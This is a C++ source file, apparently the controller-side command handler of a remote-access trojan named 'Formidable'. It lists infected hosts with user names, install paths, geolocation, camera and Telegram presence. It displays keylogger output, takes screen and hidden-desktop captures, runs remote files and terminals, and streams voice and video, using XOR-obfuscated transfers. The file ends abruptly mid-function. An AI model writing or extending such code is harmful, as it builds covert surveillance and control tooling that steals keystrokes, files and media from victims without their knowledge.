// CommandHandler.cpp - 命令处理模块实现
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <objbase.h>
#include <objidl.h>
#include <mmsystem.h>
#include <gdiplus.h>
#include <vector>
#include <cstdlib>

#include "CommandHandler.h"
#include "../../Common/ClientTypes.h"
#include "../../Common/Config.h"
#include "../../Common/Utils.h"
#include "../resource.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../MainWindow.h"
#include "../Utils/StringHelper.h"
#include "../UI/TerminalDialog.h"
#include "../UI/FileDialog.h"
#include "../Server/Security/CommandValidator.h"
#include "../Server/Utils/Logger.h"
#include <CommCtrl.h>
#include <shellapi.h>
#include <map>
#include <mutex>
#include <thread>
#include <sstream>

#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

using namespace Formidable;

static std::map<uint32_t, int> s_screenLogState;
static std::map<uint32_t, uint64_t> s_lastProgressTick;
static std::mutex s_progressMutex;
static const unsigned char kTransferKey[] = {
    0x3A, 0x7F, 0x12, 0x9C, 0x55, 0xE1, 0x08, 0x6D,
    0x4B, 0x90, 0x2E, 0xA7, 0x1C, 0xF3, 0xB5, 0x63
};
static const uint32_t kEncryptFlag = 0x80000000u;
using namespace Formidable::Utils;

static std::string ReadIpText(const char* data, size_t cap) {
    if (!data || cap == 0) return std::string();
    size_t len = 0;
    while (len < cap && data[len] != '\0') ++len;
    std::string out(data, data + len);
    return StringHelper::Trim(out);
}

static bool IsIpTextValid(const std::string& text) {
    if (text.empty()) return false;
    bool hasDigit = false;
    for (unsigned char c : text) {
        if (c >= '0' && c <= '9') {
            hasDigit = true;
            continue;
        }
        if (c == '.' || c == ':') continue;
        if ((c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) continue;
        return false;
    }
    return hasDigit;
}

// 外部声明
extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HWND g_hMainWnd;
extern HWND g_hListClients;

namespace Formidable {
namespace Core {

// 实现代码...

// 自定义消息
#define WM_LOC_UPDATE (WM_USER + 101)
#define WM_UPDATE_PROGRESS (WM_USER + 201)

static void XorCryptBuffer(char* data, int len, uint32_t chunkIndex) {
    if (!data || len <= 0) return;
    uint32_t seed = chunkIndex * 2654435761u;
    size_t keyLen = sizeof(kTransferKey);
    for (int i = 0; i < len; ++i) {
        unsigned char k = kTransferKey[(i + seed) % keyLen];
        unsigned char s = (unsigned char)((seed >> ((i & 3) * 8)) & 0xFF);
        data[i] = (char)(data[i] ^ (k ^ s));
    }
}


void CommandHandler::HandlePacket(uint32_t clientId, const BYTE* pData, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!client || !client->active) return;

    // 优先检查：如果是裸 ClientInfo（未用 CommandPkg 包装），直接处理上线
    // 原始协议：客户端连接后直接发送 PkgHeader + ClientInfo
    if (iLength == sizeof(Formidable::ClientInfo) && client->listIndex == -1) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pData);
        return;
    }

    // 其他数据都应该是 CommandPkg 格式
    // CommandPkg的实际大小是 sizeof(CommandPkg) - 1 + 数据长度
    if (iLength < sizeof(Formidable::CommandPkg) - 1) {
        // 数据太短，无法处理
        return;
    }
    
    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)pData;

    // 安全校验：验证命令ID和包大小
    // cmd=0 是上线注册的特殊情况，CommandValidator 暂不处理
    if (pkg->cmd != 0) {
        if (!Formidable::Server::Security::CommandValidator::ValidateCommand(pkg->cmd)) {
            // 非法命令，记录日志并断开连接
             // AddLog(L"Security", L"Invalid Command ID from Client " + std::to_wstring(clientId));
             Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_WARNING, "Invalid Command ID " + std::to_string(pkg->cmd) + " from Client " + std::to_string(clientId));
            return;
        }

        if (!Formidable::Server::Security::CommandValidator::CheckCommandPermissions(clientId, pkg->cmd)) {
             // AddLog(L"Security", L"Permission Denied for Command " + std::to_wstring(pkg->cmd));
             Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_WARNING, "Permission Denied for Command " + std::to_string(pkg->cmd) + " from Client " + std::to_string(clientId));
             return;
        }

        if (!Formidable::Server::Security::CommandValidator::IsValidPacketSize(pkg->cmd, iLength)) {
            // 包过大，可能是溢出攻击
            // printf("Security Alert: Packet too large (%d) for Command %d from Client %d\n", iLength, pkg->cmd, clientId);
            Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_ERROR, "Packet too large (" + std::to_string(iLength) + ") for Command " + std::to_string(pkg->cmd) + " from Client " + std::to_string(clientId));
            return;
        }
    }
    
    // 处理上线包（新版本格式）：cmd=0, arg1=sizeof(ClientInfo) 表示这是上线注册包
    if (pkg->cmd == 0 && pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
        return;
    }
    
    switch (pkg->cmd) {
        case Formidable::CMD_HEARTBEAT:
            HandleHeartbeat(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_LIST:
            HandleProcessList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_MODULES:
            HandleModuleList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_NETWORK_LIST:
            HandleNetworkList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SERVICE_LIST:
        case Formidable::CMD_SERVICE_START:
        case Formidable::CMD_SERVICE_STOP:
        case Formidable::CMD_SERVICE_DELETE:
            HandleServiceList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_LIST:
            HandleWindowList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_SNAPSHOT:
            HandleWindowSnapshot(clientId, pkg, iLength);
            break;
        case Formidable::CMD_KEYLOG:
            HandleKeylog(clientId, pkg, iLength);
            break;
        case Formidable::CMD_TERMINAL_DATA:
            HandleTerminalData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_GET_SYSINFO:
            HandleSystemInfo(clientId, pkg, iLength);
            break;
        case Formidable::CMD_REGISTRY_CTRL:
            HandleRegistryData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_LIST:
            HandleFileList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_SEARCH:
            HandleFileList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_DRIVE_LIST:
            HandleDriveList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DATA:
            HandleFileData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DOWNLOAD:
            HandleFileDownload(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_UPLOAD:
            HandleFileUpload(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DELETE:
            HandleFileDelete(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_RENAME:
            HandleFileRename(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_RUN:
            HandleFileRun(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_MKDIR:
            HandleFileMkdir(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_SIZE:
            HandleFileSize(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_COMPRESS:
            HandleFileCompress(clientId, pkg, iLength, true);
            break;
        case Formidable::CMD_FILE_UNCOMPRESS:
            HandleFileCompress(clientId, pkg, iLength, false);
            break;
        case Formidable::CMD_FILE_PREVIEW:
            HandleFilePreview(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_HISTORY:
            HandleFileHistory(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_MONITOR:
            HandleFileMonitor(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SCREEN_CAPTURE:
            HandleScreenCapture(clientId, pkg, iLength);
            break;
        case Formidable::CMD_BACKGROUND_SCREEN_CAPTURE:
            HandleBackgroundScreenCapture(clientId, pkg, iLength);
            break;
        case Formidable::CMD_BACKGROUND_CREATE:
        case Formidable::CMD_BACKGROUND_EXECUTE:
            HandleBackgroundGeneric(clientId, pkg, iLength);
            break;
        case Formidable::CMD_MOUSE_EVENT:
            // 鼠标事件由客户端处理，Master端不需要响应
            break;
        case Formidable::CMD_KEY_EVENT:
            // 键盘事件由客户端处理，Master端不需要响应
            break;
        case Formidable::CMD_VOICE_STREAM:
            HandleVoiceStream(clientId, pkg, iLength);
            break;
        case Formidable::CMD_VIDEO_STREAM:
            HandleVideoStream(clientId, pkg, iLength);
            break;
        default:
            break;
    }
}

void CommandHandler::HandleHeartbeat(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (iLength >= sizeof(Formidable::CommandPkg)) {
        if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
            Formidable::ClientInfo* newInfo = (Formidable::ClientInfo*)pkg->data;
            uint64_t now = GetTickCount64();
            int32_t rtt = (int32_t)(now - client->lastHeartbeatSendTime);

            memcpy(&client->info, newInfo, sizeof(Formidable::ClientInfo));
            client->info.rtt = rtt;

            {
                std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
                std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
                std::wstring uniqueKey = computerName + L"_" + userName;

                if (!computerName.empty() || !userName.empty()) {
                    std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
                    HistoryHost& hist = g_HistoryHosts[uniqueKey];
                    hist.clientUniqueId = client->info.clientUniqueId;
                    hist.ip = Utils::StringHelper::UTF8ToWide(client->ip);
                    hist.computerName = computerName;
                    hist.userName = userName;
                    hist.osVersion = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
                    hist.installTime = Utils::StringHelper::UTF8ToWide(client->info.installTime);
                    hist.programPath = Utils::StringHelper::UTF8ToWide(client->info.programPath);
                    hist.remark = client->remark;

                    SYSTEMTIME st;
                    GetLocalTime(&st);
                    wchar_t szTime[64];
                    swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                    hist.lastSeen = szTime;
                }
            }

            // 更新 UI
            std::wstring wRTT = std::to_wstring(rtt) + L"ms";
            std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);
            std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);

            if (client->listIndex >= 0) {
        LVITEMW lvi = { 0 };
        lvi.iSubItem = 7; // RTT
        lvi.pszText = (LPWSTR)wRTT.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
        
        lvi.iSubItem = 10; // Uptime
        lvi.pszText = (LPWSTR)wUptime.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
        
        lvi.iSubItem = 11; // Active Window
        lvi.pszText = (LPWSTR)wActWin.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
    } else {
        // 如果客户端已经在列表中但 listIndex 还是 -1（可能重连），重新插入或更新
        HandleClientInfo(clientId, &client->info);
    }
}
    }
    client->lastHeartbeat = GetTickCount64();
}

void CommandHandler::HandleClientInfo(uint32_t clientId, const Formidable::ClientInfo* info) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!info) return;
    memcpy(&client->info, info, sizeof(Formidable::ClientInfo));
    
    // 如果客户端报告了公网IP，则更新IP（优先信任客户端报告的公网IP，特别是解决FRP等代理导致IP显示为127.0.0.1的问题）
    std::string oldIP = client->ip;
    if (client->info.publicAddr[0] != '\0') {
        std::string reportedIP = ReadIpText(client->info.publicAddr, sizeof(client->info.publicAddr));
        if (reportedIP.empty() || !IsIpTextValid(reportedIP)) {
            reportedIP.clear();
        }
        // 如果当前记录的IP是本地回环或内网IP，或者为空，则强制使用报告的公网IP
        if (!reportedIP.empty() && (client->ip == "127.0.0.1" || client->ip.find("192.168.") == 0 || 
            client->ip.find("10.") == 0 || client->ip.find("172.") == 0 || client->ip.empty())) {
            client->ip = reportedIP;
        }
    }
    
    // 同步备注和分组
    std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
    std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
    std::wstring uniqueKey = computerName + L"_" + userName;

    {
        std::lock_guard<std::mutex> lock(g_SavedRemarksMutex);
        if (g_SavedRemarks.count(uniqueKey)) {
            client->remark = g_SavedRemarks[uniqueKey];
        } else if (info->remark[0] != L'\0') {
            client->remark = info->remark;
        }
    }

    if (client->group.empty() && info->group[0] != L'\0') client->group = info->group;
    
    // 更新历史记录
    {
        std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
        HistoryHost& hist = g_HistoryHosts[uniqueKey];
        hist.clientUniqueId = client->info.clientUniqueId;
        hist.installTime = Utils::StringHelper::UTF8ToWide(client->info.installTime);
        hist.programPath = Utils::StringHelper::UTF8ToWide(client->info.programPath);
        hist.ip = Utils::StringHelper::UTF8ToWide(client->ip);
        hist.computerName = computerName;
        hist.userName = userName;
        hist.osVersion = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        wchar_t szTime[64];
        swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        hist.lastSeen = szTime;
        hist.remark = client->remark;
    }
    
    std::wstring wIP = Utils::StringHelper::UTF8ToWide(client->ip);
    if (wIP.empty() && !client->ip.empty()) {
        wIP = Utils::StringHelper::ANSIToWide(client->ip);
    }
    int index = client->listIndex;

    SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);

    if (index < 0) {
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM;
        lvi.pszText = (LPWSTR)wIP.c_str();
        lvi.lParam = (LPARAM)clientId;
        lvi.iItem = 0; // 插入到最前面

        index = (int)SendMessageW(g_hListClients, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
        
        // 更新其他所有在线客户端的 listIndex
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            for (auto& pair : g_Clients) {
                if (pair.second->clientId != clientId && pair.second->listIndex >= 0) {
                    pair.second->listIndex++;
                }
            }
        }
        client->listIndex = index;
    } else {
        // 更新第一列（IP）
        LVITEMW lvi = { 0 };
        lvi.iSubItem = 0;
        lvi.pszText = (LPWSTR)wIP.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lvi);
    }
    
    std::wstring wPort = std::to_wstring(client->port);
    std::wstring wLAN = Utils::StringHelper::UTF8ToWide(client->info.lanAddr);
    std::wstring wComp = Utils::StringHelper::UTF8ToWide(client->info.computerName);
    std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(client->info.userName) + L"/" + client->info.group;
    std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
    std::wstring wRTT = std::to_wstring(client->info.rtt) + L"ms";
    std::wstring wVer = Utils::StringHelper::UTF8ToWide(client->info.version);
    std::wstring wInst = Utils::StringHelper::UTF8ToWide(client->info.installTime);
    std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);
    std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);

    LVITEMW lviSet = { 0 };
    lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPort.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    if (client->location.empty() || oldIP != client->ip) {
        lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)L"正在获取...";
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);

        // 异步获取地理位置
        std::thread([clientId, client]() {
            std::string location = GetLocationByIP(client->ip);
            std::wstring wLoc = Utils::StringHelper::UTF8ToWide(location);
            
            struct UpdateData { uint32_t id; std::wstring loc; int index; };
            UpdateData* data = new UpdateData{ clientId, wLoc, client->listIndex };
            
            PostMessageW(g_hMainWnd, WM_LOC_UPDATE, 0, (LPARAM)data);
        }).detach();
    } else {
        lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)client->location.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    }
    
    lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wLAN.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wComp.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 5; lviSet.pszText = (LPWSTR)wUserGroup.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 6; lviSet.pszText = (LPWSTR)wOS.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wRTT.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)wVer.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 9; lviSet.pszText = (LPWSTR)wInst.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 10; lviSet.pszText = (LPWSTR)wUptime.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 11; lviSet.pszText = (LPWSTR)wActWin.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 12; lviSet.pszText = (LPWSTR)client->remark.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    std::wstring wCamera = client->info.hasCamera ? L"是" : L"否";
    lviSet.iSubItem = 13; lviSet.pszText = (LPWSTR)wCamera.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);

    std::wstring wTelegram = client->info.hasTelegram ? L"是" : L"否";
    lviSet.iSubItem = 14; lviSet.pszText = (LPWSTR)wTelegram.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);

    SendMessageW(g_hListClients, WM_SETREDRAW, TRUE, 0);

    // 异步获取地理位置
    std::thread([clientId, client]() {
        std::string location = GetLocationByIP(client->ip);
        std::wstring wLoc = Utils::StringHelper::UTF8ToWide(location);
        
        struct UpdateData { uint32_t id; std::wstring loc; int index; };
        UpdateData* data = new UpdateData{ clientId, wLoc, client->listIndex };
        
        PostMessageW(g_hMainWnd, WM_LOC_UPDATE, 0, (LPARAM)data);
    }).detach();
}

void CommandHandler::HandleProcessList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
        HWND hList = GetDlgItem(client->hProcessDlg, IDC_LIST_PROCESS);
        int count = (int)(pkg->arg1 / sizeof(Formidable::ProcessInfo));
        if (pkg->arg1 == 0 || (pkg->arg1 % sizeof(Formidable::ProcessInfo)) != 0) {
            SendMessage(hList, WM_SETREDRAW, FALSE, 0);
            ListView_DeleteAllItems(hList);
            SendMessage(hList, WM_SETREDRAW, TRUE, 0);
            SetWindowTextW(client->hProcessDlg, L"进程管理 - 未获取到数据");
            return;
        }

        Formidable::ProcessInfo* pInfo = (Formidable::ProcessInfo*)pkg->data;

        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        ListView_DeleteAllItems(hList);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = (LPARAM)pInfo[i].pid;
            
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
            
            std::wstring wPID = std::to_wstring(pInfo[i].pid);
            std::wstring wThreads = std::to_wstring(pInfo[i].threads);
            std::wstring wPriority = std::to_wstring(pInfo[i].priority);
            std::wstring wArch = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].arch);
            
            wchar_t szMem[64];
            if (pInfo[i].workingSet > 1024 * 1024)
                swprintf_s(szMem, L"%.1f MB", pInfo[i].workingSet / (1024.0 * 1024.0));
            else
                swprintf_s(szMem, L"%llu KB", pInfo[i].workingSet / 1024);
            
            wchar_t szCpu[32];
            swprintf_s(szCpu, L"%.1f%%", pInfo[i].cpuUsage);

            std::wstring wOwner = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].owner);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPID.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wThreads.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPriority.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wArch.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 5; lviSet.pszText = szMem;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 6; lviSet.pszText = szCpu;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wOwner.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
        wchar_t title[64] = { 0 };
        swprintf_s(title, L"进程管理 - 共 %d 项", count);
        SetWindowTextW(client->hProcessDlg, title);
    }
}

void CommandHandler::HandleModuleList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hModuleDlg && IsWindow(client->hModuleDlg)) {
        HWND hList = GetDlgItem(client->hModuleDlg, IDC_LIST_MODULES);
        ListView_DeleteAllItems(hList);

        int count = pkg->arg1 / sizeof(Formidable::ModuleInfo);
        Formidable::ModuleInfo* pInfo = (Formidable::ModuleInfo*)pkg->data;

        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = (LPARAM)pInfo[i].baseAddr;

            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            wchar_t szBase[32];
            swprintf_s(szBase, L"0x%016llX", pInfo[i].baseAddr);
            std::wstring wSize = std::to_wstring(pInfo[i].size);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = szBase;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wSize.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleTerminalData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        // 使用自定义消息发送数据，让对话框自己处理
        SendMessageW(client->hTerminalDlg, WM_TERMINAL_APPEND_TEXT, 0, (LPARAM)wText.c_str());
    }
}

void CommandHandler::HandleWindowList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        HWND hList = GetDlgItem(client->hWindowDlg, IDC_LIST_WINDOW);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        // 客户端发送的是字符串格式，格式为：hwnd|className|title\n
        std::string data(pkg->data, pkg->arg1);
        std::istringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;

            // 解析每行数据：hwnd|pid|className|title
            size_t pos1 = line.find('|');
            if (pos1 == std::string::npos) continue;
            size_t pos2 = line.find('|', pos1 + 1);
            if (pos2 == std::string::npos) continue;
            size_t pos3 = line.find('|', pos2 + 1);
            if (pos3 == std::string::npos) continue; // New format requires PID

            std::string hwndStr = line.substr(0, pos1);
            std::string pidStr = line.substr(pos1 + 1, pos2 - pos1 - 1);
            std::string classNameStr = line.substr(pos2 + 1, pos3 - pos2 - 1);
            std::string titleStr = line.substr(pos3 + 1);

            // 转换hwnd
            uint64_t hwnd = 0;
            try {
                hwnd = std::stoull(hwndStr);
            } catch (...) {
                continue;
            }

            std::wstring wTitle = Utils::StringHelper::UTF8ToWide(titleStr);
            std::wstring wClassName = Utils::StringHelper::UTF8ToWide(classNameStr);
            std::wstring wPid = Utils::StringHelper::UTF8ToWide(pidStr);

            wchar_t szHwnd[32];
            swprintf_s(szHwnd, L"0x%016llX", hwnd);

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = index;
            lvi.pszText = (LPWSTR)wTitle.c_str();
            lvi.lParam = (LPARAM)hwnd;
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            ListView_SetItemText(hList, idx, 1, szHwnd);
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wPid.c_str());
            ListView_SetItemText(hList, idx, 3, (LPWSTR)wClassName.c_str());

            index++;
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleKeylog(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
        HWND hEdit = GetDlgItem(client->hKeylogDlg, IDC_EDIT_KEYLOG);
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        int len = GetWindowTextLengthW(hEdit);
        SendMessageW(hEdit, EM_SETSEL, len, len);
        SendMessageW(hEdit, EM_REPLACESEL, FALSE, (LPARAM)wText.c_str());
        SendMessageW(hEdit, WM_VSCROLL, SB_BOTTOM, 0);
    }
}

void CommandHandler::HandleWindowSnapshot(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        if (pkg->arg1 > 0) {
            // 创建位图
